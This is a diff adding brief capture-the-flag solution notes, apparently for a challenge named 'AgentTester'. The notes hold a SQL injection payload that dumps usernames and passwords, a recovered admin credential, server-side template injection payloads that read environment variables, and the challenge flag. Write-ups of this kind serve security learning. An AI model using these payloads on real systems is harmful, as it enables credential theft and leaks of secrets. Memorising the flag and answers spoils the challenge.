@@ -1,0 +1,18 @@
+SQL Injection
+
+
+mozilla' UNION SELECT group_concat(username),group_concat(password) from user;-- -
+
+	admin,l3o in url: *)(@skdnaj238374834**__**=,l3o
+
+Get the credential admin:*)(@skdnaj238374834**__**=
+
+Login, post request to /debug with `code` parameter for SSTI
+
+
+agenttester/run.sh
+	export CHALLENGE_NAME="AgentTester" && export CHALLENGE_FLAG="<REDACTED>"
+
+{{config.__class__.__init__.__globals__['os'].environ}} or
+{{environ}}
+	flag{fb4a87cfa85cf8c5ab2effedb4ea7006}
